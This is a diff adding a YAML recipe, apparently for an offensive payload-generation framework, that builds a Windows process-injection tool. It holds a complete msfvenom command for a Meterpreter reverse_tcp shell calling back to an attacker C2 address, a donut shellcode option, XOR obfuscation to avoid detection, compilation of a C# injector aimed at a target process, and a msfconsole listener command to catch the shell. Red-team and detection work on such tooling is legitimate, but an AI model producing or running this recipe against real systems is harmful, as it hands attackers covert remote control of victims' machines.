@@ -1,0 +1,107 @@
+meta:
+  name: "Shellcode Injection with Options"
+  category: "Process Injection"
+  description: |
+    Example recipe demonstrating preprocessing options.
+    Choose between different shellcode generation methods (msfvenom, donut, or custom).
+  effectiveness: "medium"
+  mitre:
+    tactic: "TA0002 - Execution"
+    technique: "T1055 - Process Injection"
+  artifacts:
+    - "Spawned process with injected code"
+    - "Network connection to C2 (if using reverse shell)"
+
+parameters:
+  # Parameters for msfvenom
+  - name: "lhost"
+    type: "ip"
+    description: "Attacker/C2 server IP address for reverse connection"
+    required_for: "Msfvenom shellcode"
+    required: true
+
+  - name: "lport"
+    type: "port"
+    description: "Port for reverse connection"
+    required_for: "Msfvenom shellcode"
+    required: true
+    default: 443
+
+  # Parameters for donut
+  - name: "executable_path"
+    type: "file"
+    description: "Path to the executable to convert with donut"
+    required_for: "Donut shellcode"
+    required: true
+
+  # Parameters for custom shellcode
+  - name: "shellcode_hex"
+    type: "hex"
+    description: "Custom shellcode in hexadecimal format (without 0x prefix)"
+    required_for: "Custom shellcode"
+    required: true
+
+  # Common parameters
+  - name: "process_name"
+    type: "string"
+    description: "Target process name for injection"
+    required: true
+    default: "notepad.exe"
+
+preprocessing:
+  # Option type with multiple shellcode generation methods
+  - type: "option"
+    name: "Select shellcode generation method"
+    options:
+      # Option 1: Msfvenom (default - first in list)
+      - type: "command"
+        name: "Msfvenom shellcode"
+        command: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{ lhost }} LPORT={{ lport }} EXITFUNC=thread -f raw"
+        output_var: "raw_shellcode"
+
+      # Option 2: Donut
+      - type: "command"
+        name: "Donut shellcode"
+        command: "donut -f {{ executable_path }} -a 2"
+        output_var: "raw_shellcode"
+
+      # Option 3: Custom shellcode (convert from hex)
+      - type: "script"
+        name: "Custom shellcode"
+        script: "hex_to_bytes.py"
+        args:
+          hex_string: "{{ shellcode_hex }}"
+        output_var: "raw_shellcode"
+
+  # XOR encryption (applied to whichever shellcode was selected)
+  - type: "script"
+    name: "xor_encrypt"
+    script: "xor_encrypt.py"
+    args:
+      data: "{{ raw_shellcode }}"
+      key: "0xAA"
+    output_var: "encrypted_shellcode"
+
+output:
+  type: "template"
+  template: "process_injection/xor_injector.cs"
+  filename: "injector_{{ process_name | replace('.exe', '') }}.cs"
+  compile:
+    enabled: true
+    language: "csharp"
+    output_filename: "injector.exe"
+    args: "/unsafe /optimize+"
+  launch_instructions: |
+    # Launch Instructions
+    
+    ## Run the injector
+    
+    ```powershell
+    .\injector.exe
+    ```
+    
+    ## If using msfvenom, start a listener:
+    
+    ```bash
+    msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; run"
+    ```
